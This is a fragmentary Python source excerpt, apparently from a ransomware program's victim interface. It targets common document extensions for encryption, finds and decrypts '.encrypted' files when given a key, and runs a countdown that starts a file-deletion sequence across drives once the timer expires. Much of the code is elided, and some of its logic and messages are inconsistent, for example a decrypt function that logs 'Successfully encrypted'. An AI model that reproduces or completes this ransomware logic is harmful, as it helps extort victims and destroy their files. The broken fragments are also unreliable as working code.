...
ICON_PATH = resource_path("img/logo.jpg")
...
EXTENSIONS_TO_ENCRYPT = ['.txt', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
    ...
    def scan_and_decrypt(self, key):
            ...
            for dp, dn, filenames in os.walk(drive):
                ...
                for f in filenames:
                    if f.endswith('.encrypted'):
                        ...
                        self.log(f"Found encrypted file: {file_path}")
        ...
        for file_path in encrypted_files:
            try:
                ...
                self.log(f"Error decrypted : {file_path}: {e}")
...
#Step 47: Function to decrypt a single file
    def decrypt_file(self, file_path, key):
        try:
            ...
            os.remove(file_path)
            self.log(f"Successfully encrypted: {file_path}")
            return True
        except Exception as e:
            ...
            with open(TIMER_STATE_FILE, 'r') as f:
                ...
                if not state:
                    ...
                    if datetime.now()>=self.closing_time:
                        ...
                        messagebox.showinfo("Notfication", "Time has expired. Initiating deletion sequence")
...
#Step:49 Function to update the timer
    def update_timer(self):
        ...
        if remaining_time.total_seconds() >0:
            ...
            self.timer_label.config(text="Your timer is up")
            self.begin_deletion_sequence()
            ...
            for current_directory, directories, files in os.walk(directory,topdown=False):
                ...
                for file in files:
                    ...
                    try:
                        ...
                        self.log(f"Error during Deletion : {file_path} : {e}")
                    time.sleep(5)
            ...
            for drive in drives:
                ...
                if os.path.exists(d_data_path):
                    ...
                    if self.stop_event.is_set():
                        return
            for drive in drives:
                self.log(f"Starting deletion in drives {drive}")
